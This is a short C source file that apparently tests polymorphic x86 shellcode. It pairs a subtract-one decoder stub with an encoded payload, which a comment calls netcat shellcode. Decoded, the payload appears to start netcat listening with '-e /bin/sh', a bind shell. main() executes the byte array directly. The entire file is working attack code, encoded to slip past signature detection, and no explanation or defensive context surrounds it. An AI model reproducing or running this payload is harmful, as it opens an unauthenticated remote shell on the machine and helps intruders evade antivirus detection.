/*
  Call full payload (decoder + encoded payload)
*/

char polymorphic[] =
  // ./get_opcodes decode_sub.o
  "\xeb\x11\x5e\x31\xc9\xb1\x5b\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
  // ./encode_sub (with netcat shellcode)
  "\xec\x2b\x5f\x32\xc1\x89\x47\x08\x89\x47\x10\x89\x47\x1a\x8a\x77\x1b\x8e\x5f\x09\x8a\x5f\x1f\x8e\x5f\x11\x8a\x5f\x23\x8a\x47\x27\xb1\x0c\x8a\xf4\x8e\x4f\x1b\x8e\x57\x27\xce\x81\xe9\xd2\x00\x00\x00\x30\x63\x6a\x6f\x30\x6f\x64\x31\x2e\x6d\x71\x35\x33\x35\x33\x31\x2e\x66\x30\x63\x6a\x6f\x30\x74\x69\x31\x44\x42\x37\x35\x38\x60\x46\x4d\x4a\x55\x46\x60\x55\x46\x42\x4e";

int main()
{
  int (*payload)();
  payload = polymorphic;
  payload();
}
